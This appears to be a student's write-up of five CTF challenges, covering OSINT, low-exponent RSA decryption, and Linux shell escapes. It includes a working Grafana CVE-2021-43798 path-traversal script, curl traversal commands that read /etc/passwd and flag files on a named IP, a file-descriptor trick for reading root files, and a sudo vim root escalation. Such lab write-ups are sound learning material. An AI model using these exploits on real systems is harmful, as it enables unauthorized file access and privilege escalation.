#  { 0per4ti0n_Sh4d0w_Tr4c3 }

## FLAG :   1 Kalpit Lal Rama

So first of all the name `Kalpit Lal Rama` was the amateur hacker who left his real name. I tried to once look up his name in the student search just to ensure that he was not a student of this college...no results. I then tried to view the page source that is the first thing I do, god knows why but the first thing I do is `Ctrl+U`. I spent some time over there looking for any suspicious file or any comment in the HTML file but like after 1 or 2 hour of searching I didn't find anything that could provide me something to work upon.

Then I searched the name on my web browser so there was a LinkedIn profile which showed up at the top and it was clearly understood that the profile image was AI generated so i was able to understand that this account can have something for me. I searched for the contact info...found nothing then i looked in the about section...nothing there also and In that account there were no posts or any other things there was just a link for the twitter account that was the only thing which i could do over there.I opened the twitter account so the account opened was Kalp only similar to the previous name. SO just below the account name there was a reddit accocunt, i scrolled down to look what all is there, i found some random messages there and one video where some people were rowing a boat, i watched it for 2 3 times but i was not able to look anything unusual although there was a message just above "there is something important on the water" something like this so i thought the video might contain something, but there was nothing.

I once checked the followers and following of that account as it could also have some information but all the accounts that were being followed they seemed genuine verified account becuase of the number of their followers so i left those accounts and after that i clicked on the reddit account..as it was another thing present on that page to explore...In the reddit account there were 3 posts as far as i remeber, i sequentially opened them in the first one there was image so it was of no use according to the instructions the other post also only had an image which i left because there were less chances of hiding the flags in images as told.Third post also looked quite genuine to still i looked once in the source page ifn search of any comment that might have been holding the flag there. But i didn't find anything.

After that i went to the comments section where it was written i like these numbes..quite different statement neither related to rowing or anything in that comment the numbers were also hidden so like it was something unsusual and in the hints also we were told that if you find some **number** then look for base<x> encodings.I searched that how can we decode such numbers to get useful texts and then it told me some websites like the cyberchef and dcode.fr in which we just have to paste the text and try different tools to decode our text. I tried many things like converted them to base64 

12668958
29326
23627944634268
3108
8
523948
01050036027972
87177902339084610664

Finally in one conversion i got : HTTPS WWW INSTAGRAM COM I LIKE ANONYMITY SOMETIMES1212

which is a clear instagram account and then i opened it...there was the same profile pic as that on the linkedin account similar to that. The insta page was filled with rowing realted content like various athletes and some other videos, some images that were also realted to rowing and somw other type of images(discussed later). So i was watching carefully the posts in the highlights section as there were too many i thought that a flag might be there on any post for a fraction of seconds. But it wasn't the case, i watched all the videos twice. In one video i saw a watermark that was a reddit account i opened that account and searched there for some time to get some clue like any post or comment and one more reddit account on the car banner , i searched that also but nothing suspicious, i even looked in accounts of some of the people that were mentioned on the videos but all of them were genuine accounts like nothing related to my purpose could be present over there but i still once went through some of the accounts after that while watching the highlights when i watched more carefully in one of the posts it was written "i might have dropped some information" the text was so small that it got missed from my sight twice so then ater noticing it , the next obvious thing was to open that wikipdeia page above which this indication was given , it was the page of **"Thomas Keller Medal"**I.   

There were too many things to explore like we also had option to edit source i first tried this as i thought that by editing something I might be able to reveal the flag.I read the content it contained some urls and i thought there might be any flag in comment format so i searched for terms like pclub,flag,hidden.I still once saw the page quickly like  if any thing unsual was present there or not . I serached in external links as the name suggested that I might get something which i could further exlpore but there also the content looked quiet genuine and all those names present there were mostly of athletes related to rowing.There were tons on links on almost evey page that i visited,i got bit confused also that where could the flag be.. i searched for some of the names there and visited their page also but found nothing so i came back from where i started because doing like this would take too much timw and i might miss also something.  

I started looking again at the original page becuase the post revelaed that page only so believing on this i continued further after various tries i saw the otpion of view history i though it might be of no use as it might contain information about some past events but when i clicked on it at the very top there were 2 contributions from KapilLal20 and 2 from Kapilx, Iwas sure that from here I would get some hint because it was related to our task ony.I iwed curr and prev for all of them starting from Kapilx19 but the actual flag i got in curr section of KapilLal20 only.   


**`PClub{idk_how_this_got_typed}`**

---
---

## FLAG : 2 



from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from sympy import integer_nthroot

The input i gave was A and based in my input it generated a ciphertext


padding_str = "A"
padding = int(sha256(padding_str.encode()).hexdigest(), 16)

### Example: replace this with the actual value you get from the server
ciphertext =134375264724364437942161831944473471609577231135052328479904790691137157510326678355563261590293472140467382405173493233765793>
  ### <- you’ll get this from the server after option 3

### Cube root
m_plus_padding, exact = integer_nthroot(ciphertext, 3)

### Subtract padding
flag_int = m_plus_padding - padding
flag = long_to_bytes(flag_int)
print(flag.decode())






**`PClub{RSA_with_low_exponents_is_risky_without_padding}`**


---
---
## FLAG : 3  GRAFANA VULNERABILITIES

This flag took a bit time for me as i did some wrong things which deviated me from the goal.

Here also I wasted some of my time in viewing the page source og Blog 2 opening different files, there i opened the sources and searched in all files keywords like flag,hidden,Pclub etc... after that I downloaded all the images present on blog2 like that of grafana and from somewhere i got the logo of Pclub also named favicon.ico iirc (not particularly on this page but i found it somewhere), yes i was in network and refreshed the page then it appeared i thought that this might contain something and searched for strings in it, used stegsolve,exiftool,binwalk nearly everything i can do realted to an image and i did for almost all the images that i found but it never gave back any useful clue and I did not find anything over there as always.

After reading the hints i looked at the version that was given to us for exploiting was 8.3.0. So I just saw that what were the vulnerabilities in this version of grafana as guidided by our seniors to see the common vulnerabilties of grafana. I was seeing some youtube videos and in some of the videos i saw some creators using a Repository named similar to CVE 2021-43798 this is basically a vulnerability for this version and some versions below also. In this the attacker who does not have important admin powers could still make modifications and ammendments at sensitive locations. This was termed as Privilege Escalation Vulnerabilities (read online only).

At first I cloned that repository on my Kali ( exploit-grafana-CVE-2021-43798 ) and then i tried this *python3 exploit.py* and my target URL was: *http://13.126.50.182:3000* i saw this from a youtube tutorial but i was not able to implement it properly. So I read some articles that what exactly is that gets exploited so i found that i can use path traversal method to reach till the desired flag like i saw this structure to try various plugins and reach a path that is accessible so the syntax was something like this

At first i tried all the plugins possible to see if i can get something or any other valuable information to proceed like I created a python file which consisted all the plugins like alertlist,annolist,graph,logs etc

I tried some manual attempts but then i came to know that there are many plugins so its not feasible to write manually then i came across how to write codes that make our work easier and how to apply them in our problem like this code written below.
                                                                                                           
import requests  
def banner():
    print("""
Grafana CVE-2021-43798 Exploit
Automatic Path Traversal Attack
    """)

### List of plugin paths to try (from known vulnerable paths)
plugin_paths = [
    "alertlist", "annolist", "barchart", "bargauge", "canvas", "dashlist","gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource",
    "graph", "heatmap", "histogram", "logs", "loki", "mssql", "mysql","news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres",
    "prometheus", "stackdriver", "stat", "state-timeline", "status-histor","table", "table-old", "tempo", "testdata", "text", "timeseries",  "welcome", "zipkin"
]

### Target file to read
target_file = "../../../../../../../../../../etc/passwd"

### Main exploit function
def exploit(target_url):  
    found = False  
    for plugin in plugin_paths:  
        path = f"{target_url}/public/plugins/{plugin}/{target_file}"  
        print(f"[+] Trying: {path}")  
        try:  
            res = requests.get(path, timeout=5)  
            if res.status_code == 200 and "root:" in res.text:  
                print(f"\n[!!!] Vulnerable via plugin: {plugin}")  
                print("[+] Contents of /etc/passwd:\n")  
                print(res.text)  
                found = True  
                break  
        except requests.RequestException as e:  
            print(f"[-] Error connecting to {path}: {e}")  
    if not found:  
        print("\n[-] Target does not seem vulnerable or plugin paths blocked.")  

### Entry point
if __name__ == "__main__":  
    banner()  
    # Put your target URL here  
    target = "http://13.126.50.182:3000"    
    exploit(target)  

I then understanded the working of such scrits so that i can apply it further although this didn't work but i tried this also.

At last after searching more that what to do if these plugins re not working then i got to know that the etc/passwd that i was writing at the end was creating the problem. The hint slipped from my mind that "*the hacker had placed the flag at a temporary location* and when i realized this then i thought to search in the temp files , i might get something useful in those files.

i tried these commands on the terminal keeping in mind the hint **temporary file**  

curl --path-as-is -s "http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../tmp/flag.txt"  
curl --path-as-is -s "http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../tmp/flag"  
curl --path-as-is -s "http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../tmp/.flag"  
curl --path-as-is -s "http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../tmp/hidden_flag.txt"  

we can go upto lesser directories also be reducing ../ but if we fall short then it might create a problem so 8 is sufficient because it doesnt't give error if we go more back then the last directory and still do ../ and using --path-as-is so that the exact path that we are giving is only checked, not a modified one.

And i checked one more thing that it was also working with logs instead of alertlist..i didn't check but it might work with all the plugins.

Out of all these the second one worked it was a valid path and there only the flag was stored so i got the flag.
**``PClub{Easy LFI}``**

---
---
## FLAG : 4  13.235.21.137:4657

I din't face much difficulty while finding the flag for this challenge.


First thing that comes to mind after seeing thiss information is try to connect with the mentioned address and port so i did *nc 13.235.21.137 4657* . It opened another shell for me with no TTY, so now we cannot use all the basic commands that we use in our terminal. After that the first thing we generally do to see the contents is *ls -la* there I found 2 interesting things file_chal and file_chal.c , but both of these files were accessible to the root user only.

After some searching on internet I came to know about this ***ls -l /proc/$$/fd/***...and below is the output I got, basically it can allow us to read things that aren't allowed to us a non root user. This is also a good technique. It tells that what files are currently opened by our shell.  
```bash
total 0  
lrwx------ 1 ctf ctf 64 May 24 06:14 0 -> /dev/pts/24  
lrwx------ 1 ctf ctf 64 May 24 06:14 1 -> /dev/pts/24  
lrwx------ 1 ctf ctf 64 May 24 06:14 2 -> /dev/pts/24  
lr-x------ 1 ctf ctf 64 May 24 06:14 3 -> /root/flag  
lr-x------ 1 ctf ctf 64 May 24 06:14 4 -> /root/flag   
```
So this means that this file is open root/flag/ and generally in ctfs we try to check this hidden /root/flag/ file and here it was open also we just had to read it.

After this I did these things to read the content of /root/flag/ but like normal commands weren't working as you can see below, only the last command worked as it reads directly from file descriptor 3 or 4, which is already opened by our shell.  

```bash
cat /proc/$$/fd/4 : Permission denied  
strings /proc/$$/fd/3 : strings: not found  
head /proc/$$/fd/4 : cannot open '/proc/2347/fd/4' for reading: Permission denied    
dd if=/proc/$$/fd/3 bs=1 count=100 : failed to open '/proc/2347/fd/3': Permission denied  
cat <&3 or cat <&4  
```

And this last step lead me to the flag(both of them had the same flag).



I also learned one more thing that Linux doesn’t care about who reads a file if it’s already open — like if a process is opened a file before dropping privileges, and that file is still open, you can read it from the file descriptor! and that is what i did in cat<&3.


**```PClub{4lw4ys_cl05e_y0ur_fil3s}```** 


---
---



## FLAG : 5 13.235.21.137:4729

Firstly i tried this *https://13.235.21.137:4729* but it didn't work then the other most obvious thing that came to my mind was *nc* (netcat). I did *nc 13.235.21.137 4729* it showed that can't access TTY that means now we cant use all the commands that we use normally on our terminal..only bery basic commands like ls, ls -la, cat etc. First of all I searched that whether i am the root(main user) or just a user so i ran -*whoami* it showed ctf and i tried sudo also before some commands but sudo wasn't working, in short we cannot become the root in that shell, afterthat i did *ls* to list the contents nothing came up...i tried *ls -la* sto see the hidden files ,some files listed up but i was not able to understand their use and whether they would serve my purpose or not.

I tried to open those files using cat but it said permission denied.
I searched basically what to do in this situation when we can't run our usual commands so how can we dig deeper, i got this command   `find / -type d -writable -user ctf 2>/dev/null | head -20  `  
This meant to find such writable files that are under non-root user(`ctf`) control and 2>/dev/null means remove unecessary messages and head -20 meant to show only first 20 ouputs.It gave this ouput...  
```bash
/proc/227171/task/227171/fd  
/proc/227171/fd  
/proc/227171/map_files  
/tmp/tmp.iW9ZvWmNyD   ```
```
Here also i tried some cat operations and other thing but it didn't turn out to be that helpful.  

*ls -la /home/ctf/*    
ls: cannot access '/home/ctf/': No such file or directory   
Next, I tried seeing the contents under the home directory...access denied  
```bash
*ls -la /tmp/*  
total 52  
drwxrwxrwt 1 root root 4096 May 24 09:07 .    
drwxr-xr-x 1 root root 4096 May 15 11:41 ..    
prw-r--r-- 1 ctf  ctf     0 May 23 18:11 f    
-rw-r--r-- 1 root root   14 May 24 09:07 flag   
-rw-r--r-- 1 ctf  ctf     0 May 23 04:31 flag.swp    
-rw-r--r-- 1 root root   14 May 24 07:47 recovered_    
-rw-r--r-- 1 root root   14 May 23 14:39 recovered_flag.txt    
-rw-r--r-- 1 root root   15 May 24 07:54 recovered_swl  
-rw-r--r-- 1 root root   14 May 24 07:54 recovered_swm  
-rw-r--r-- 1 root root   28 May 24 07:54 recovered_swn  
-rw-r--r-- 1 root root   14 May 24 07:54 recovered_swo  
-rw-r--r-- 1 root root   14 May 24 08:56 recovered_swo.txt  
-rw-r--r-- 1 root root   14 May 24 07:54 recovered_swp  
-rw-r--r-- 1 root root   14 May 24 08:41 recovered_swp.txt  
drwx------ 2 ctf  ctf  4096 May 23 06:10 tmp.iW9ZvWmNyD  

```
*cat /tmp/flag* : udo /bin/vim ...It gave this something weird i was not able to understand.I tried to read other files also but they were also showing udo /bin/vim.  

ps aux | grep vim
ps aux | grep flag'''  : I tried this also to find all the working files having flag or vim in their name.

After this i discovered some new things, many people might know it already but i saw it first time...
*script /dev/null -c bash* : This command creates a pseudo terminal so that we can use other utilities also which we were restricted to use in the previous shell

sudo /bin/vim -c ':!/bin/bash'  : This is called  Privilege Escalation to Root via sudo vim .I became the root user after this command and could access any restricted directory and make modifications.  

After this I checked the contents in Ubuntu there was a file named flag.txt when i tried to read, it displayed g{} which was similar to the flag format only but not the flag.  
There was also a file flag.txt.swo but it considered corrupted or some binary content, not readable, so i found that Vim swap files are not plain text.  

```bash
root@1d6089cf076a:/home# ls -la /home/ubuntu  
total 52
drwxr-x--- 1 ubuntu ubuntu  4096 May 22 17:13 .
drwxr-xr-x 1 root   root    4096 Apr 15 14:11 ..
-rw-r--r-- 1 ubuntu ubuntu   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu  3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 root   root   12288 May 22 17:13 .flag.txt.swo
-rw-r--r-- 1 root   root   12288 May 22 12:23 .flag.txt.swp
-rw-r--r-- 1 ubuntu ubuntu   807 Mar 31  2024 .profile
-rw-r--r-- 1 root   root       9 May 22 02:43 flag.txt  

root@1d6089cf076a:/home# cat /home/ubuntu/flag
cat /home/ubuntu/flag  
```
Earlier I saw ubuntu containg many files having name as flag.txt flag.swo so i thought that the flag might be present inside this only but it wasn't present.  

cat: /home/ubuntu/flag: No such file or directory
root@1d6089cf076a:/home# cat /root/flag
 
Mostly in CTFs after we become the root user we once try to see the content of flag file in the root directory. And fortunately our flag was also present in this file only . 


**``PClub{y0u_ar3_in_7he_sudoers_th1s_1nc1d3nt_will_n0t_be_rep0r7ed}``**





---
---
---
---




